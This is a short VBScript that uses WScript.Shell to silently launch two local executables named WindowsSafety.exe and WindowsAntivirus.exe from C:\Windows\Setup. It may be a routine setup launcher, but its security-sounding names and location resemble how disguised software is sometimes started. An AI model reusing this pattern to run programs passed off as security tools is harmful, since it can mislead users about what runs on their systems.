Option Explicit
Dim objWshShell
Set objWshShell = WScript.CreateObject("WScript.Shell")
objWshShell.Run "C:\Windows\Setup\WindowsSafety.exe"
objWshShell.Run "C:\Windows\Setup\WindowsAntivirus.exe"